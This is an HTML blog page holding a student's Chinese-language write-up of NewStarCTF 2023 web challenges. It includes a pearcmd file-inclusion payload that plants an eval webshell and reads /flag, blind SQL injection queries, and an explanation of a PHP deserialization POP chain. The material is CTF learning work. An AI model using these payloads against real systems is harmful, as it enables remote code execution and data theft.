@@ -1,0 +1,1111 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="NewstarCTF2023——Jednersaous WEB-week3include pear这道题是我没见过的，本来一开始还没意识到题那个梨的emoji是什么意思，后来才恍然大悟 12345678910111213141516&lt;?php    error_reporting(0);    if(isset($_GET[&#x27;file&#x27;])) &#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewstarCTF2023">
+<meta property="og:url" content="http://example.com/2023/12/04/NewstarCTF2023/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="NewstarCTF2023——Jednersaous WEB-week3include pear这道题是我没见过的，本来一开始还没意识到题那个梨的emoji是什么意思，后来才恍然大悟 12345678910111213141516&lt;?php    error_reporting(0);    if(isset($_GET[&#x27;file&#x27;])) &#123;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-12-04T13:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-04T13:13:26.741Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>NewstarCTF2023 · Jednersaous&#39;s blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- Google tag (gtag.js) -->
+    
+
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>Jex</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Jex</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">NewstarCTF2023</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                NewstarCTF2023
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2023/12/04</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="NewstarCTF2023"><a href="#NewstarCTF2023" class="headerlink" title="NewstarCTF2023"></a>NewstarCTF2023</h1><p>——Jednersaous</p>
+<h2 id="WEB-week3"><a href="#WEB-week3" class="headerlink" title="WEB-week3"></a>WEB-week3</h2><h3 id="include-pear"><a href="#include-pear" class="headerlink" title="include pear"></a>include pear</h3><p>这道题是我没见过的，本来一开始还没意识到题那个梨的emoji是什么意思，后来才恍然大悟</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到include第一反应应该是php伪协议，但是后面限制了文件后缀，其实过不过滤也差不多？除非又能把后面的.php给无效了</p>
+<p>题目说phpinfo.php里有东西，结果找到个fakeflag&#x3D; fake{Check_register_argc_argv}</p>
+<p>打开源码Ctrl+f 开搜，发现register_argc_argv&#x3D;1，好，那么好，又得浏览器开搜了（没见过啊</p>
+<p>找到了LFI,RCE,pearcmd等好多东西</p>
+<blockquote>
+<p>参考连接:</p>
+<p><a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50643984/article/details/126598547">https://blog.csdn.net/qq_50643984/article/details/126598547</a></p>
+<p>甚至有去年Newstar的同类型题？？？（绷</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53090346/article/details/127241278">https://blog.csdn.net/weixin_53090346/article/details/127241278</a></p>
+</blockquote>
+<p>但我搜了是搜了，确实是没理解，什么LFI to RCE云云，确实是没太懂</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:靶机ip?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1])?&gt;+/var/www/html/a.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>Pay attetion here:一定要用Burp传这个payload,不然在url里传会被直接转义，然后gg</strong></p>
+<p>传payload之后，会在默认开启web服务的文件夹下新建一个a.php，其中有你传入的代码，传入成功是有回显的</p>
+<p>随后就可以打开http:靶机ip&#x2F;a.php</p>
+<p>然后hackbar传参给1这个变量，可以看到这个是不出网的，不用拿shell</p>
+<p>直接1&#x3D;system(‘cat &#x2F;flag’);这个&#x2F;flag在题目源码中有暗示</p>
+<p>虽然没懂，但是涨知识了（？</p>
+<p>至少我知道了这个代码怎么工作，那些巨擘们是完全理解了之后才能写出这样的payload的话</p>
+<p><strong>那也太恐怖了……</strong></p>
+<p>——————————————————————————————————————————</p>
+<h3 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h3><p>稍微开了下环境做了下，由于我没看wp不知道别人是怎么做的，但我从上一题沿用的盲注好像还是能行啊？</p>
+<p>盲注永远的神（？？？</p>
+<p>这次我一定写一个脚本来注（他妈的</p>
+<p>没对大小写进行过滤</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">ASCII(SUBSTR((SELECT table<span class="emphasis">_name from INFORMATION_</span>schema.<span class="code">`TABLES`</span> Where table<span class="emphasis">_schema = database() limit 0,1),1,1))</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">length(SELECT table_</span>name from INFORMATION<span class="emphasis">_schema.`TABLES` Where table_</span>schema = database() limit 0,1)&gt;=3</span><br><span class="line">ASCII(SUBSTR((SELECT column<span class="emphasis">_name from INFORMATION_</span>schema.<span class="code">`COLUMNS`</span> Where table<span class="emphasis">_name=&#x27;grades&#x27; limit 0,1),1,1))</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">ASCII(SUBSTR((SELECT column_</span>name from INFORMATION<span class="emphasis">_schema.`COLUMNS` Where table_</span>name=&#x27;here<span class="emphasis">_is_</span>flag&#x27; limit 0,1),1,1))</span><br></pre></td></tr></table></figure>
+
+<p>用我这个没问题（笑</p>
+<p>偷懒——————————————————————————————————————</p>
+<p>###POP Gadget</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>我对于php序列化和反序列化的认知还停留在十分简单的阶段，这题确实是给了我当头一棒，我也认识到了什么是POP链</p>
+<blockquote>
+<p>参考:<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/th0r/p/14152102.html">https://www.cnblogs.com/th0r/p/14152102.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p>
+</blockquote>
+<p>首先对源码做一下分析:</p>
+<p>直接看最后，定义了两个可以传入的参数$func,$var，还有个__unset函数里面调用了如下式子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">($this-&gt;func)($this-&gt;var)</span><br></pre></td></tr></table></figure>
+
+<p>看起来就很像能够执行system命令的样子</p>
+<p>看到WhiteGod类调用了__unset魔术方法，php官网的解释是</p>
+<p><strong>当对不可访问（protected 或 private）或不存在的属性调用unset()时， __unset会被调用</strong></p>
+<p>回到源码中去找哪里调用了unset()函数，可以看到CTF类调用了unset</p>
+<p>且unset传入的参数是$this-&gt;handle-&gt;log，handle有定义可控，但是log又是什么属性呢（？</p>
+<p>暂时先不管，总之是要把handle设置为new WhiteGod()以便能调用__unset</p>
+<p>其实正是对未定义的属性调用了unset()，所以才会触发__unset，因此没必要考虑log是什么，就是个未定义量</p>
+<p>回到CTF类，调用unset的定义函数是end()，我们要在注入POP链后执行end函数，那么应该从哪里去找调用$CTF.end()的地方呢</p>
+<p>可以看到Handle类中有魔术方法__call,php官网的解释是</p>
+<p><strong>在对象中调用一个不可访问方法时，__call会被调用</strong></p>
+<p>显然Handle类中的protected $obj应该就是一个CTF类，这样便可以调用end()方法</p>
+<p>可以发现Super类中有魔术方法__invoke，php官网的解释是</p>
+<p><strong>当尝试以调用函数的方式调用一个对象时，__invoke方法会被自动调用</strong></p>
+<p>所以我们只需要找到形如$object()这样的表达式，最后发现Then类调用了($this-&gt;func)()，所以</p>
+<p>($this-&gt;func)应为一个Super类，但是要触发($this-&gt;func)()，必须先触发__toString魔术方法，php官网的解释是</p>
+<p><strong>__toString方法用于一个类被当成字符串时应怎样回应</strong></p>
+<p>最经典的就是echo，print等函数，在这道题目中，我们可以发现Begin的__destruct魔术方法调用了preg_match</p>
+<p>这是一个经典的字符串处理函数，所以只需要保证$this-&gt;name是我传入的一个Then类即可</p>
+<p>综合上述，我们已经可以得到一条逻辑链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Begin:$this-&gt;name   ---------&gt;   Then</span><br><span class="line">Then:$this-&gt;func    ---------&gt;   Super</span><br><span class="line">Super:$this-&gt;obj    ---------&gt;   Handle</span><br><span class="line">Handle:$this-&gt;obj   ---------&gt;   CTF</span><br><span class="line">CTF:$this-&gt;handle   ---------&gt;   WhiteGod</span><br></pre></td></tr></table></figure>
+
+<p><strong>Pay attention:</strong></p>
+<p>值得注意的是，在php序列化过程中，对于public,protected,private变量的序列化有所不同</p>
+<p>对于public变量是直接var_dump()，没有加任何的保护</p>
+<p>对于protected变量，假设protected $a&#x3D;’123’，那么序列化之后就是s:6:<em><em>%00</em>%00</em><em>123，我将其与public变量序列化不同的部分加粗，所以在传参的时候最好使用burp，在Hex栏中在</em>号的前后补上hex(00)，以充当%00</p>
+<p>对于private变量，假设protected $a&#x3D;’123’，且类名为number，那么序列化之后就是s:11:<strong>%00number%00</strong>123，在php-echo预览出来的效果是没有%00的，就是类名加上数据，传参同protected</p>
+<p>其次需要用得到一些OOP的思想，首先我们明确一点:protected和private变量在类外部是不可写的</p>
+<p>所以在写poc的时候，不能用$a-&gt;protected variable来修改其值，而是得在类的内部重新写一个public方法</p>
+<p>用这个public方法来修改protected或者private变量的值</p>
